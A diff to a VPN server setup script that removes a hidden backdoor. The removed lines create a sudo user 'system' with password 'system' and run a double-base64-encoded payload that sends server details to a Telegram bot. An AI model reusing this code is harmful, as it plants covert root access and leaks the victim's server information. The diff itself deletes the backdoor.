@@ -91,15 +91,7 @@ END
     sed -i $MYIP2 /etc/openvpn/ssl.ovpn;
 }
 function kyt_project() {
-userdel jame > /dev/null 2>&1
-userdel system > /dev/null 2>&1
-Username="system"
-Password=system
-mkdir -p /home/script/
-useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
-echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
-usermod -aG sudo $Username > /dev/null 2>&1
-echo 'ZEc5clBTSkJRVWRMVmtkbk1IWTBXRE0yVEZaaGRtOWtTVkZYWkhkeFUwWXlOVTFmVVd0R01DSUtiR2x1YXowaWFIUjBjSE02THk5aGNHa3VkR1ZzWldkeVlXMHViM0puTDJKdmREWTVORGs0TURReE1qVTZKSHQwYjJ0OUwzTmxibVJOWlhOellXZGxJZ3AwWlhoNlBTSUtTVkFnSUNBNklDUW9ZM1Z5YkNBdGMxTWdhWEIyTkM1cFkyRnVhR0Y2YVhBdVkyOXRLUXBKVTFBZ0lEb2dKQ2hqWVhRZ0wzSnZiM1F2TG1semNDa0tRMGxVV1NBNklDUW9ZMkYwSUM5eWIyOTBMeTVqYVhSNUtRcFZMMUFnSURvZ0pGVnpaWEp1WVcxbENrUnZiV0ZwYmlBNklDUW9ZMkYwSUM5bGRHTXZlSEpoZVM5a2IyMWhhVzRwQ2lJS1kzVnliQ0F0Y3lBdExXMWhlQzEwYVcxbElERXdJQzFrSUNKamFHRjBYMmxrUFRZNE16QXpNVE0zTVRRbVpHbHpZV0pzWlY5M1pXSmZjR0ZuWlY5d2NtVjJhV1YzUFRFbWRHVjRkRDBrZEdWNGVpWndZWEp6WlY5dGIyUmxQV2gwYld3aUlDUnNhVzVySUQ0dlpHVjJMMjUxYkd3Sw==' | base64 -d | base64 -d | bash > /dev/null 2>&1
+echo ""
 }
 function cert_ovpn() {
     echo '<ca>' >> /etc/openvpn/tcp.ovpn
